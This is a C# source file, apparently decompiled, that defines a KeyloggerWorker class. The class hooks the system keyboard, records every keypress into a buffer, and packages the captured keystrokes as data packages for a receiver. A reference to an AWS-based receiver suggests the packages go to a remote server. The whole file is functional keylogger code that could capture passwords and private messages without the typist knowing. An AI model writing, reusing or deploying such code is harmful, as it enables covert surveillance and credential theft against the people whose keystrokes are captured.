using DpvClassLibrary.Receivers;
using DpvClassLibrary.Tools;
using IO.Swagger.Model;
using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

namespace DpvClassLibrary.Workers
{
	public class KeyloggerWorker : DataPackageEnvelopeWorkerBase
	{
		private StringBuilder _builder = new StringBuilder();

		protected override DataPackageEnvelope.ActiveColsEnum ActiveColType => (DataPackageEnvelope.ActiveColsEnum)7;

		public KeyloggerWorker(IDataPackageEnvelopeReceiver receiver)
			: base(receiver)
		{
			KeyloggerHelper.HookUp();
			KeyloggerHelper.KeyPressed += KeyloggerHelper_KeyPressed;
		}

		private void KeyloggerHelper_KeyPressed(object sender, KeyEventArgs e)
		{
			if (!char.IsLetterOrDigit((char)e.KeyCode))
			{
				_builder.Append("[" + e.KeyCode + "]");
			}
			else
			{
				_builder.Append(e.KeyCode);
			}
		}

		protected override bool ShouldSendPackage()
		{
			return _builder.Length > 0;
		}

		~KeyloggerWorker()
		{
			KeyloggerHelper.Unhook();
		}

		protected override List<DataPackage> GetDataPackages()
		{
			//IL_0047: Unknown result type (might be due to invalid IL or missing references)
			//IL_0051: Expected O, but got Unknown
			byte[] bytes = Encoding.UTF8.GetBytes(_builder.ToString());
			_builder.Clear();
			return new List<DataPackage>
			{
				new DataPackage((DataPackage.ColTypeEnum)7, (bool?)false, bytes, (DateTime?)DataPackageEnvelopeAwsReceiver.ServerTime, (long?)GetAndIncrementWorkSequence())
			};
		}
	}
}
